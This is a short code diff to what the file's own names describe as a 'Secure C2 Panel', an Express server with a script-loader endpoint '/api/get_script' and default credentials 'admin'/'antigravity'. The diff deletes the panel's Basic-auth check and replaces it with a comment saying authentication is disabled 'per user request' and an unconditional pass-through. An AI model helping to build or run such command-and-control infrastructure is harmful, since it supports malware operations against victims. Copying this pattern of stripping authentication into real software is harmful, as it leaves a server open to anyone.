@@ -13,18 +13,8 @@ const PANEL_USERNAME = process.env.C2_USER || 'admin';
 const PANEL_PASSWORD = process.env.C2_PASS || 'antigravity';
 
 app.use((req, res, next) => {
-    // Only protect the dashboard, not the script loader endpoint
-    if (req.path === '/api/get_script') return next();
-
-    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
-    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');
-
-    if (login && password && login === PANEL_USERNAME && password === PANEL_PASSWORD) {
-        return next();
-    }
-
-    res.set('WWW-Authenticate', 'Basic realm="Secure C2 Panel"');
-    res.status(401).send('401 Unauthorized - Secure C2 Access Only.');
+    // Authentication disabled per user request
+    return next();
 });
 
 app.use(express.static(path.join(__dirname, 'public')));
